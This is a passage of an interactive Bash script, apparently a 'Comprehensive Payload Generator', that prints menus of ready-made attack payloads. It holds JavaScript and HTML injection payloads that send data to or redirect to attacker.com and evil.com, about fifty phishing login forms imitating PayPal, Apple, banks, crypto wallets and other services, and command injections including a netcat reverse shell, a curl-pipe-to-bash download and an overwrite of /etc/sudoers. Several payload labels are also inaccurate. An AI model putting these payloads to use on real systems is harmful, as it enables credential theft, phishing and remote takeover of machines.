            40) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com', true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ code: 'eval(\"alert(1)\")' }));</script>" "Remote Code Execution via JavaScript Injection";;
            41) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('sql_query=SELECT * FROM users WHERE id=1');</script>" "Client-Side SQL Injection via JavaScript";;
            42) display_payload "<script>var ws = new WebSocket('ws://attacker.com'); ws.onmessage = function(event) { alert('Triggering WebSocket XSS: ' + event.data); }</script>" "Triggering WebSocket Connections for XSS";;
            43) display_payload "<script>window.location.href = 'javascript:alert(1)';</script>" "Stealthy Script Injection via JavaScript URL";;
            44) display_payload "<script>document.body.innerHTML = '<div style=\"position:fixed;top:0;left:0;width:100%;background-color:black;color:white;text-align:center;\">Hacked by JavaScript</div>';</script>" "Browser Hijacking via JavaScript Injection";;
            45) display_payload "<script>document.getElementById('form').addEventListener('submit', function(e){ alert('DOM Event Hijacking'); });</script>" "DOM Event Hijacking";;
            46) display_payload "<script>window.location.replace('http://attacker.com');</script>" "Cross-Site Redirect Injection using JavaScript";;
            47) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('redirect=http://attacker.com');</script>" "Redirect Injection with XMLHttpRequest and POST";;
            48) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('spoofed_request=attacker');</script>" "Spoofing POST Requests via JavaScript Injection";;
            49) display_payload "<script>var form = document.createElement('form'); form.action = 'http://attacker.com/csrf'; form.method = 'POST'; var input = document.createElement('input'); input.type = 'hidden'; input.name = 'csrf_token'; input.value = 'attacker_token'; form.appendChild(input); document.body.appendChild(form); form.submit();</script>" "Cross-Site Request Forgery (CSRF) using JavaScript";;
            50) display_payload "<script>document.getElementById('test').setAttribute('onclick', 'alert(1)');</script>" "Bypass Web Application Firewalls with JavaScript Injection";;
            51) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# HTML Injection Payloads
html_injection_payloads() {
    while true; do
        echo -e "\e[33m1) HTML Tag Injection\e[0m"
        echo -e "\e[33m2) HTML Comment Injection\e[0m"
        echo -e "\e[33m3) HTML Attribute Injection (Image onerror)\e[0m"
        echo -e "\e[33m4) HTML Form Injection\e[0m"
        echo -e "\e[33m5) HTML Image Source Injection\e[0m"
        echo -e "\e[33m6) HTML Iframe Injection (malicious iframe)\e[0m"
        echo -e "\e[33m7) HTML Image Map Injection\e[0m"
        echo -e "\e[33m8) HTML Audio Source Injection\e[0m"
        echo -e "\e[33m9) HTML Video Source Injection\e[0m"
        echo -e "\e[33m10) HTML Object Injection\e[0m"
        echo -e "\e[33m11) HTML Embed Tag Injection\e[0m"
        echo -e "\e[33m12) HTML Picture Tag Injection\e[0m"
        echo -e "\e[33m13) HTML Table Injection (XSS)\e[0m"
        echo -e "\e[33m14) HTML Div Injection (XSS)\e[0m"
        echo -e "\e[33m15) HTML Base Tag Injection (Redirect)\e[0m"
        echo -e "\e[33m16) HTML Form Submission Hijacking (XSS)\e[0m"
        echo -e "\e[33m17) HTML Link Injection (CSS file)\e[0m"
        echo -e "\e[33m18) HTML Select Dropdown Injection\e[0m"
        echo -e "\e[33m19) HTML Input Radio Button Injection\e[0m"
        echo -e "\e[33m20) HTML Textarea Injection (XSS)\e[0m"
        echo -e "\e[33m21) HTML Button Element Injection (XSS)\e[0m"
        echo -e "\e[33m22) HTML Form Action Override Injection (XSS)\e[0m"
        echo -e "\e[33m23) HTML Frame Injection (XSS)\e[0m"
        echo -e "\e[33m24) HTML Link with target='_blank' Injection\e[0m"
        echo -e "\e[33m25) HTML Image Source Injection (base64)\e[0m"
        echo -e "\e[33m26) HTML Font Injection (XSS)\e[0m"
        echo -e "\e[33m27) HTML Input Element Injection (XSS)\e[0m"
        echo -e "\e[33m28) HTML Meta Tag Injection (XSS via meta)\e[0m"
        echo -e "\e[33m29) HTML Base Tag Injection (Redirect)\e[0m"
        echo -e "\e[33m30) HTML SVG Injection (XSS)\e[0m"
        echo -e "\e[33m31) HTML Custom JavaScript Injection (Inline)\e[0m"
        echo -e "\e[33m32) HTML Script Injection (JavaScript)\e[0m"
        echo -e "\e[33m33) HTML CSS Injection (style tag)\e[0m"
        echo -e "\e[33m34) HTML Meta Refresh (Redirect)\e[0m"
        echo -e "\e[33m35) HTML Custom Alert Popup Injection\e[0m"
        echo -e "\e[33m36) HTML Source Mapping Injection\e[0m"
        echo -e "\e[33m37) HTML Document.write Injection\e[0m"
        echo -e "\e[33m38) HTML Canvas Injection (Stealth XSS)\e[0m"
        echo -e "\e[33m39) HTML Data URI Injection\e[0m"
        echo -e "\e[33m40) HTML JavaScript Pseudo-Protocol Injection\e[0m"
        echo -e "\e[33m41) HTML Form Data Reflection Injection\e[0m"
        echo -e "\e[33m42) HTML Custom Window.open() Injection\e[0m"
        echo -e "\e[33m43) HTML Cross-Origin Resource Injection\e[0m"
        echo -e "\e[33m44) HTML Event Handler Injection (onclick)\e[0m"
        echo -e "\e[33m45) HTML DOM Manipulation via XSS Injection\e[0m"
        echo -e "\e[33m46) HTML QuerySelector Injection (DOM XSS)\e[0m"
        echo -e "\e[33m47) HTML WebSocket Injection (Cross-Site WebSocket)\e[0m"
        echo -e "\e[33m48) HTML Object Type Injection (XSS)\e[0m"
        echo -e "\e[33m49) HTML Inline CSS Injection (Cross-Site)\e[0m"
        echo -e "\e[33m50) HTML Nonces Injection (XSS)\e[0m"
        echo -e "\e[33m51) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<h1>Hacked!</h1>" "HTML Tag Injection";;
            2) display_payload "<!-- Comment Hack -->" "HTML Comment Injection";;
            3) display_payload "<img src='x' onerror='alert(1)' />" "HTML Attribute Injection (Image onerror)";;
            4) display_payload "<form action='http://evil.com/steal_data' method='POST'><input type='text' name='user_data' /><input type='submit' /></form>" "HTML Form Injection";;
            5) display_payload "<img src='http://evil.com/malicious_image.jpg' />" "HTML Image Source Injection";;
            6) display_payload "<iframe src='http://evil.com' width='600' height='400'></iframe>" "HTML Iframe Injection (malicious iframe)";;
            7) display_payload "<map name='image-map'><area target='_blank' alt='Malicious' href='http://evil.com' coords='34,44,270,350' shape='rect' /></map>" "HTML Image Map Injection";;
            8) display_payload "<audio src='http://evil.com/malicious_audio.mp3' autoplay></audio>" "HTML Audio Source Injection";;
            9) display_payload "<video src='http://evil.com/malicious_video.mp4' autoplay></video>" "HTML Video Source Injection";;
            10) display_payload "<object data='http://evil.com/malicious_object' type='text/html'></object>" "HTML Object Injection";;
            11) display_payload "<embed src='http://evil.com/malicious_flash.swf' width='600' height='400'></embed>" "HTML Embed Tag Injection";;
            12) display_payload "<picture><source srcset='http://evil.com/malicious_image.jpg' /><img src='http://evil.com/default_image.jpg' /></picture>" "HTML Picture Tag Injection";;
            13) display_payload "<table><tr><td>Injected Data</td></tr></table>" "HTML Table Injection (XSS)";;
            14) display_payload "<div style='background: red; height: 100px;'>Injected Div</div>" "HTML Div Injection (XSS)";;
            15) display_payload "<base href='http://evil.com/' />" "HTML Base Tag Injection (Redirect)";;
            16) display_payload "<form action='http://evil.com/steal_data' method='POST'><input type='text' name='user_data' value='stolen_data'/><input type='submit' id='submitBtn' /></form><script>document.getElementById('submitBtn').click();</script>" "HTML Form Submission Hijacking (XSS)";;
            17) display_payload "<link rel='stylesheet' href='http://evil.com/malicious_style.css'>" "HTML Link Injection (CSS file)";;
            18) display_payload "<select><option value='1'>Option 1</option><option value='2'>Option 2</option></select>" "HTML Select Dropdown Injection";;
            19) display_payload "<input type='radio' name='group1' value='1' checked> Option 1" "HTML Input Radio Button Injection";;
            20) display_payload "<textarea>Injected text</textarea>" "HTML Textarea Injection (XSS)";;
            21) display_payload "<button>Click Me</button>" "HTML Button Element Injection (XSS)";;
            22) display_payload "<form action='http://evil.com/steal_data' method='POST'><input type='text' name='user_data' value='stolen_data'/><input type='submit' /></form><script>document.forms[0].submit();</script>" "HTML Form Action Override Injection (XSS)";;
            23) display_payload "<frame src='http://evil.com' width='600' height='400'></frame>" "HTML Frame Injection (XSS)";;
            24) display_payload "<a href='http://evil.com' target='_blank'>Click here</a>" "HTML Link with target='_blank' Injection";;
            25) display_payload "<img src='data:image/png;base64, [base64_data]' />" "HTML Image Source Injection (base64)";;
            26) display_payload "<font color='red'>Injected Font</font>" "HTML Font Injection (XSS)";;
            27) display_payload "<input type='text' value='<img src=\"http://evil.com/malicious_image.jpg\" />' />" "HTML Input Element Injection (XSS)";;
            28) display_payload "<meta http-equiv='refresh' content='0; url=http://evil.com' />" "HTML Meta Tag Injection (XSS via meta)";;
            29) display_payload "<base href='http://evil.com/' />" "HTML Base Tag Injection (Redirect)";;
            30) display_payload "<svg><script>alert(1)</script></svg>" "HTML SVG Injection (XSS)";;
            31) display_payload "<script>alert('XSS Attack!')</script>" "HTML Custom JavaScript Injection (Inline)";;
            32) display_payload "<script>alert(1);</script>" "HTML Script Injection (JavaScript)";;
            33) display_payload "<style>body { background-color: red; }</style>" "HTML CSS Injection (style tag)";;
            34) display_payload "<meta http-equiv='refresh' content='0; url=http://evil.com' />" "HTML Meta Refresh (Redirect)";;
            35) display_payload "<script>alert('Popup');</script>" "HTML Custom Alert Popup Injection";;
            36) display_payload "<script>document.location='http://evil.com';</script>" "HTML Source Mapping Injection";;
            37) display_payload "<script>document.write('Injected!');</script>" "HTML Document.write Injection";;
            38) display_payload "<canvas id='xss' width='200' height='200'></canvas><script>document.getElementById('xss').getContext('2d').fillText('XSS', 50, 50);</script>" "HTML Canvas Injection (Stealth XSS)";;
            39) display_payload "<img src='data:image/svg+xml;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zY3JpcHQtZGVzYyI+PHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIHN0eWxlPSJmaWxsOiByZWQ7Ii8+PC9zdmc+Cg==' />" "HTML Data URI Injection";;
            40) display_payload "<a href='javascript:alert(1)'>Click Me</a>" "HTML JavaScript Pseudo-Protocol Injection";;
            41) display_payload "<form method='GET' action='http://evil.com/stolen_data'><input type='text' name='user_data'/><input type='submit'></form>" "HTML Form Data Reflection Injection";;
            42) display_payload "<script>window.open('http://evil.com')</script>" "HTML Custom Window.open() Injection";;
            43) display_payload "<script>new WebSocket('ws://evil.com')</script>" "HTML Cross-Origin Resource Injection";;
            44) display_payload "<a href='#' onclick='alert(1)'>Click</a>" "HTML Event Handler Injection (onclick)";;
            45) display_payload "<div id='xss' onclick='alert(1)'>Click here</div>" "HTML DOM Manipulation via XSS Injection";;
            46) display_payload "<div id='xss' style='display:none;' onmouseover='alert(1)'>Hover me</div>" "HTML QuerySelector Injection (DOM XSS)";;
            47) display_payload "<script>var socket = new WebSocket('ws://evil.com'); socket.send('XSS');</script>" "HTML WebSocket Injection";;
            48) display_payload "<object type='text/html' data='http://evil.com'></object>" "HTML Object Type Injection (XSS)";;
            49) display_payload "<style>@import url('http://evil.com/style.css');</style>" "HTML Inline CSS Injection (Cross-Site)";;
            50) display_payload "<meta name='nonce' content='malicious_nonce'>" "HTML Nonces Injection (XSS)";;
            51) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Phishing Payloads
phishing_payloads() {
    while true; do
        echo -e "\e[33m1) Custom Phishing Form with Injected JavaScript\e[0m"
        echo -e "\e[33m2) Fake Admin Panels\e[0m"
        echo -e "\e[33m3) Fake Credit Card Forms\e[0m"
        echo -e "\e[33m4) Fake Two-Factor Authentication Pages\e[0m"
        echo -e "\e[33m5) Fake Account Recovery Forms\e[0m"
        echo -e "\e[33m6) Fake Social Media Login Pages\e[0m"
        echo -e "\e[33m7) Fake Email Login Pages\e[0m"
        echo -e "\e[33m8) Fake Payment Gateway Forms\e[0m"
        echo -e "\e[33m9) Fake Software Update Pages\e[0m"
        echo -e "\e[33m10) Fake Bank Login Pages\e[0m"
        echo -e "\e[33m11) Fake Cloud Storage Login Pages\e[0m"
        echo -e "\e[33m12) Fake DNS Server Login Page (Advanced)\e[0m"
        echo -e "\e[33m13) Fake File Sharing Login Pages\e[0m"
        echo -e "\e[33m14) Fake Wi-Fi Network Login Pages\e[0m"
        echo -e "\e[33m15) Fake VPN Login Pages\e[0m"
        echo -e "\e[33m16) Fake Webmail Login Pages\e[0m"
        echo -e "\e[33m17) Fake Online Shopping Login Pages\e[0m"
        echo -e "\e[33m18) Fake Online Game Login Pages\e[0m"
        echo -e "\e[33m19) Fake Cryptocurrency Wallet Login Pages\e[0m"
        echo -e "\e[33m20) Fake Online Banking Verification Pages\e[0m"
        echo -e "\e[33m21) Fake Video Streaming Service Login Pages\e[0m"
        echo -e "\e[33m22) Fake Mobile App Login Pages\e[0m"
        echo -e "\e[33m23) Fake File Upload Form (Malicious Upload)\e[0m"
        echo -e "\e[33m24) Fake Email Verification Pages\e[0m"
        echo -e "\e[33m25) Fake Social Media Verification Pages\e[0m"
        # New payloads:
        echo -e "\e[33m26) Fake Government Login Pages\e[0m"
        echo -e "\e[33m27) Fake Corporate Intranet Login Pages\e[0m"
        echo -e "\e[33m28) Fake PayPal Login Page\e[0m"
        echo -e "\e[33m29) Fake Apple ID Login Page\e[0m"
        echo -e "\e[33m30) Fake Netflix Login Page\e[0m"
        echo -e "\e[33m31) Fake Amazon Login Page\e[0m"
        echo -e "\e[33m32) Fake Google Account Recovery Page\e[0m"
        echo -e "\e[33m33) Fake Instagram Login Page\e[0m"
        echo -e "\e[33m34) Fake Twitter Login Page\e[0m"
        echo -e "\e[33m35) Fake Facebook Login Page\e[0m"
        echo -e "\e[33m36) Fake LinkedIn Login Page\e[0m"
        echo -e "\e[33m37) Fake Reddit Login Page\e[0m"
        echo -e "\e[33m38) Fake Snapchat Login Page\e[0m"
        echo -e "\e[33m39) Fake WhatsApp Verification Page\e[0m"
        echo -e "\e[33m40) Fake Uber Login Page\e[0m"
        echo -e "\e[33m41) Fake Spotify Login Page\e[0m"
        echo -e "\e[33m42) Fake Dropbox Login Page\e[0m"
        echo -e "\e[33m43) Fake Microsoft Account Login Page\e[0m"
        echo -e "\e[33m44) Fake Adobe ID Login Page\e[0m"
        echo -e "\e[33m45) Fake Zoom Login Page\e[0m"
        echo -e "\e[33m46) Fake GitHub Login Page\e[0m"
        echo -e "\e[33m47) Fake Tumblr Login Page\e[0m"
        echo -e "\e[33m48) Fake Pinterest Login Page\e[0m"
        echo -e "\e[33m49) Fake Telegram Login Page\e[0m"
        echo -e "\e[33m50) Fake Signal Login Page\e[0m"
        echo -e "\e[33m51) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<script>var injectedForm=\`<div style='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:700px;padding:60px;background-color:#333;color:white;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,0.7);font-family:Arial,sans-serif;font-size:18px;'><h2 style='text-align:center;margin-bottom:40px;font-size:40px;color:#4CAF50;'>Login</h2><form action='http://phishingsite.com/login' method='POST'><input type='text' name='username' placeholder='Username' style='width:100%;padding:18px;margin-bottom:25px;border-radius:8px;font-size:20px;border:2px solid #ddd;background-color:#f7f7f7;color:#333;'><input type='password' name='password' placeholder='Password' style='width:100%;padding:18px;margin-bottom:35px;border-radius:8px;font-size:20px;border:2px solid #ddd;background-color:#f7f7f7;color:#333;'><button type='submit' style='width:100%;padding:18px;background-color:#4CAF50;color:white;border:none;border-radius:8px;cursor:pointer;font-size:22px;transition:background-color 0.3s ease;'>Login</button></form></div><style>button:hover{background-color:#45a049;}input:focus{outline:none;border-color:#4CAF50;}</style>\`;document.body.innerHTML+=injectedForm;</script>" "Custom phishing form with injected JavaScript to steal login credentials.";;
            2) display_payload "<form action='http://phishingsite.com/admin' method='POST'><input type='text' name='admin_username' placeholder='Admin Username'><input type='password' name='admin_password' placeholder='Admin Password'><button type='submit'>Login</button></form>" "Fake Admin Panels";;
            3) display_payload "<form action='http://phishingsite.com/credit-card' method='POST'><input type='text' name='card_number' placeholder='Card Number'><input type='text' name='expiry' placeholder='Expiry Date'><input type='text' name='cvv' placeholder='CVV'><button type='submit'>Submit</button></form>" "Fake Credit Card Forms";;
            4) display_payload "<form action='http://phishingsite.com/2fa' method='POST'><input type='text' name='otp' placeholder='Enter OTP'><button type='submit'>Submit</button></form>" "Fake Two-Factor Authentication Pages";;
            5) display_payload "<form action='http://phishingsite.com/recovery' method='POST'><input type='text' name='email' placeholder='Email Address'><button type='submit'>Submit</button></form>" "Fake Account Recovery Forms";;
            6) display_payload "<form action='http://phishingsite.com/social-login' method='POST'><input type='text' name='social_username' placeholder='Social Username'><input type='password' name='social_password' placeholder='Social Password'><button type='submit'>Login</button></form>" "Fake Social Media Login Pages";;
            7) display_payload "<form action='http://phishingsite.com/email-login' method='POST'><input type='email' name='email' placeholder='Email Address'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Email Login Pages";;
            8) display_payload "<form action='http://phishingsite.com/payment' method='POST'><input type='text' name='card_number' placeholder='Card Number'><input type='text' name='expiry' placeholder='Expiry Date'><input type='text' name='cvv' placeholder='CVV'><input type='text' name='address' placeholder='Billing Address'><button type='submit'>Pay Now</button></form>" "Fake Payment Gateway Forms";;
            9) display_payload "<form action='http://phishingsite.com/software-update' method='POST'><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Update Now</button></form>" "Fake Software Update Pages";;
            10) display_payload "<form action='http://phishingsite.com/bank-login' method='POST'><input type='text' name='account_number' placeholder='Account Number'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Bank Login Pages";;
            11) display_payload "<form action='http://phishingsite.com/cloud-login' method='POST'><input type='email' name='email' placeholder='Email Address'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Cloud Storage Login Pages";;
            12) display_payload "<form action='http://phishingsite.com/dns-login' method='POST'><input type='text' name='dns_username' placeholder='DNS Username'><input type='password' name='dns_password' placeholder='DNS Password'><button type='submit'>Login</button></form>" "Fake DNS Server Login Page (Advanced)";;
            13) display_payload "<form action='http://phishingsite.com/file-sharing' method='POST'><input type='text' name='file_id' placeholder='File ID'><input type='password' name='file_password' placeholder='Password'><button type='submit'>Access File</button></form>" "Fake File Sharing Login Pages";;
            14) display_payload "<form action='http://phishingsite.com/wifi-login' method='POST'><input type='text' name='wifi_username' placeholder='Wi-Fi Username'><input type='password' name='wifi_password' placeholder='Wi-Fi Password'><button type='submit'>Login</button></form>" "Fake Wi-Fi Network Login Pages";;
            15) display_payload "<form action='http://phishingsite.com/vpn-login' method='POST'><input type='text' name='vpn_username' placeholder='VPN Username'><input type='password' name='vpn_password' placeholder='VPN Password'><button type='submit'>Login</button></form>" "Fake VPN Login Pages";;
            16) display_payload "<form action='http://phishingsite.com/webmail-login' method='POST'><input type='email' name='email' placeholder='Email Address'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Webmail Login Pages";;
            17) display_payload "<form action='http://phishingsite.com/shopping-login' method='POST'><input type='email' name='email' placeholder='Email Address'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Online Shopping Login Pages";;
            18) display_payload "<form action='http://phishingsite.com/game-login' method='POST'><input type='text' name='game_username' placeholder='Game Username'><input type='password' name='game_password' placeholder='Game Password'><button type='submit'>Login</button></form>" "Fake Online Game Login Pages";;
            19) display_payload "<form action='http://phishingsite.com/crypto-wallet-login' method='POST'><input type='text' name='wallet_id' placeholder='Wallet ID'><input type='password' name='wallet_password' placeholder='Wallet Password'><button type='submit'>Login</button></form>" "Fake Cryptocurrency Wallet Login Pages";;
            20) display_payload "<form action='http://phishingsite.com/banking-verification' method='POST'><input type='text' name='bank_id' placeholder='Bank ID'><input type='password' name='bank_password' placeholder='Bank Password'><button type='submit'>Verify</button></form>" "Fake Online Banking Verification Pages";;
            21) display_payload "<form action='http://phishingsite.com/video-streaming-login' method='POST'><input type='text' name='stream_username' placeholder='Username'><input type='password' name='stream_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Video Streaming Service Login Pages";;
            22) display_payload "<form action='http://phishingsite.com/mobile-app-login' method='POST'><input type='text' name='app_username' placeholder='App Username'><input type='password' name='app_password' placeholder='App Password'><button type='submit'>Login</button></form>" "Fake Mobile App Login Pages";;
            23) display_payload "<form action='http://phishingsite.com/file-upload' method='POST' enctype='multipart/form-data'><input type='file' name='file' accept='image/*,video/*,text/*'><button type='submit'>Upload File</button></form>" "Fake File Upload Form (Malicious Upload)";;
            24) display_payload "<form action='http://phishingsite.com/email-verification' method='POST'><input type='email' name='email' placeholder='Email Address'><button type='submit'>Verify</button></form>" "Fake Email Verification Pages";;
            25) display_payload "<form action='http://phishingsite.com/social-verification' method='POST'><input type='text' name='social_id' placeholder='Social ID'><button type='submit'>Verify</button></form>" "Fake Social Media Verification Pages";;
            26) display_payload "<form action='http://phishingsite.com/government-login' method='POST'><input type='text' name='gov_username' placeholder='Government Username'><input type='password' name='gov_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Government Login Pages";;
            27) display_payload "<form action='http://phishingsite.com/corporate-login' method='POST'><input type='text' name='corp_username' placeholder='Corporate Username'><input type='password' name='corp_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Corporate Intranet Login Pages";;
            28) display_payload "<form action='http://phishingsite.com/paypal-login' method='POST'><input type='text' name='paypal_username' placeholder='PayPal Username'><input type='password' name='paypal_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake PayPal Login Page";;
            29) display_payload "<form action='http://phishingsite.com/apple-id-login' method='POST'><input type='text' name='apple_id' placeholder='Apple ID'><input type='password' name='apple_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Apple ID Login Page";;
            30) display_payload "<form action='http://phishingsite.com/netflix-login' method='POST'><input type='text' name='netflix_username' placeholder='Netflix Username'><input type='password' name='netflix_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Netflix Login Page";;
            31) display_payload "<form action='http://phishingsite.com/amazon-login' method='POST'><input type='text' name='amazon_username' placeholder='Amazon Username'><input type='password' name='amazon_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Amazon Login Page";;
            32) display_payload "<form action='http://phishingsite.com/google-recovery' method='POST'><input type='email' name='email' placeholder='Email Address'><button type='submit'>Recover Account</button></form>" "Fake Google Account Recovery Page";;
            33) display_payload "<form action='http://phishingsite.com/instagram-login' method='POST'><input type='text' name='username' placeholder='Instagram Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Instagram Login Page";;
            34) display_payload "<form action='http://phishingsite.com/twitter-login' method='POST'><input type='text' name='twitter_username' placeholder='Twitter Username'><input type='password' name='twitter_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Twitter Login Page";;
            35) display_payload "<form action='http://phishingsite.com/facebook-login' method='POST'><input type='text' name='facebook_username' placeholder='Facebook Username'><input type='password' name='facebook_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Facebook Login Page";;
            36) display_payload "<form action='http://phishingsite.com/linkedin-login' method='POST'><input type='text' name='linkedin_username' placeholder='LinkedIn Username'><input type='password' name='linkedin_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake LinkedIn Login Page";;
            37) display_payload "<form action='http://phishingsite.com/reddit-login' method='POST'><input type='text' name='reddit_username' placeholder='Reddit Username'><input type='password' name='reddit_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Reddit Login Page";;
            38) display_payload "<form action='http://phishingsite.com/snapchat-login' method='POST'><input type='text' name='snapchat_username' placeholder='Snapchat Username'><input type='password' name='snapchat_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Snapchat Login Page";;
            39) display_payload "<form action='http://phishingsite.com/whatsapp-verification' method='POST'><input type='text' name='phone_number' placeholder='Phone Number'><button type='submit'>Verify</button></form>" "Fake WhatsApp Verification Page";;
            40) display_payload "<form action='http://phishingsite.com/uber-login' method='POST'><input type='text' name='uber_username' placeholder='Uber Username'><input type='password' name='uber_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Uber Login Page";;
            41) display_payload "<form action='http://phishingsite.com/spotify-login' method='POST'><input type='text' name='spotify_username' placeholder='Spotify Username'><input type='password' name='spotify_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Spotify Login Page";;
            42) display_payload "<form action='http://phishingsite.com/dropbox-login' method='POST'><input type='text' name='dropbox_username' placeholder='Dropbox Username'><input type='password' name='dropbox_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Dropbox Login Page";;
            43) display_payload "<form action='http://phishingsite.com/microsoft-login' method='POST'><input type='text' name='microsoft_username' placeholder='Microsoft Username'><input type='password' name='microsoft_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Microsoft Account Login Page";;
            44) display_payload "<form action='http://phishingsite.com/adobe-login' method='POST'><input type='text' name='adobe_username' placeholder='Adobe Username'><input type='password' name='adobe_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Adobe ID Login Page";;
            45) display_payload "<form action='http://phishingsite.com/zoom-login' method='POST'><input type='text' name='zoom_username' placeholder='Zoom Username'><input type='password' name='zoom_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Zoom Login Page";;
            46) display_payload "<form action='http://phishingsite.com/github-login' method='POST'><input type='text' name='github_username' placeholder='GitHub Username'><input type='password' name='github_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake GitHub Login Page";;
            47) display_payload "<form action='http://phishingsite.com/tumblr-login' method='POST'><input type='text' name='tumblr_username' placeholder='Tumblr Username'><input type='password' name='tumblr_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Tumblr Login Page";;
            48) display_payload "<form action='http://phishingsite.com/pinterest-login' method='POST'><input type='text' name='pinterest_username' placeholder='Pinterest Username'><input type='password' name='pinterest_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Pinterest Login Page";;
            49) display_payload "<form action='http://phishingsite.com/telegram-login' method='POST'><input type='text' name='telegram_username' placeholder='Telegram Username'><input type='password' name='telegram_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Telegram Login Page";;
            50) display_payload "<form action='http://phishingsite.com/signal-login' method='POST'><input type='text' name='signal_username' placeholder='Signal Username'><input type='password' name='signal_password' placeholder='Password'><button type='submit'>Login</button></form>" "Fake Signal Login Page";;
            51) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Command and System Injection Payloads
command_injection_payloads() {
    while true; do
        echo -e "\e[33m1) Basic Command Injection\e[0m"
        echo -e "\e[33m2) OS Command Injection\e[0m"
        echo -e "\e[33m3) Reverse Shell Injection\e[0m"
        echo -e "\e[33m4) File Inclusion via Command Injection\e[0m"
        echo -e "\e[33m5) Privilege Escalation via Command Injection\e[0m"
        echo -e "\e[33m6) Command Injection via URL Redirection\e[0m"
        echo -e "\e[33m7) Command Injection in Web Application Firewall (WAF)\e[0m"
        echo -e "\e[33m8) PHP System Command Injection (eval)\e[0m"
        echo -e "\e[33m9) Python os.system() Injection\e[0m"
        echo -e "\e[33m10) System File Manipulation via Command Injection\e[0m"
        echo -e "\e[33m11) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "; ls -la" "Basic Command Injection";;
            2) display_payload "& cat /etc/passwd" "OS Command Injection";;
            3) display_payload "| nc -e /bin/bash attacker.com 4444" "Reverse Shell Injection (Run on target) Use listener: \e[36mnc -lvnp 4444\e[0m";;
            4) display_payload "; cat /etc/passwd" "File Inclusion via Command Injection";;
            5) display_payload "echo 'Test' | sudo tee /etc/sudoers" "Privilege Escalation via Command Injection";;
            6) display_payload "; curl http://attacker.com/malicious_script.sh | bash" "Command Injection via URL Redirection";;
            7) display_payload "; curl -X GET 'http://target.com/cgi-bin/system?command=ls'" "Command Injection in Web Application Firewall (WAF)";;
            8) display_payload "; php -r 'system($_GET[\"cmd\"]);'" "PHP System Command Injection (eval)";;
            9) display_payload "; python -c 'import os; os.system(\"ls -la\")'" "Python os.system() Injection";;
            10) display_payload "; echo 'malicious content' > /tmp/malicious_file" "System File Manipulation via Command Injection";;
            11) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Main menu
main_menu() {
    while true; do
        echo -e "\e[1;33mSelect a payload category:\e[0m"
        echo -e "1) SQL Injection Payloads"
        echo -e "2) XSS Payloads"
        echo -e "3) JavaScript Injection Payloads"
        echo -e "4) HTML Injection Payloads"
        echo -e "5) Phishing Payloads"
        echo -e "6) Command & System Injection Payloads"
        echo -e "9) Exit"
        read -p "Enter your choice: " choice

        case $choice in
            1) sql_injection_payloads;;
            2) xss_payloads;;
            3) javascript_injection_payloads;;
            4) html_injection_payloads;;
            5) phishing_payloads;;
            6) command_injection_payloads;;
            9) echo -e "\e[32mExiting... Goodbye!\e[0m"; exit 0;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# Script execution
clear
echo -e "\e[1;36mWelcome to the Comprehensive Payload Generator!\e[0m"
main_menu
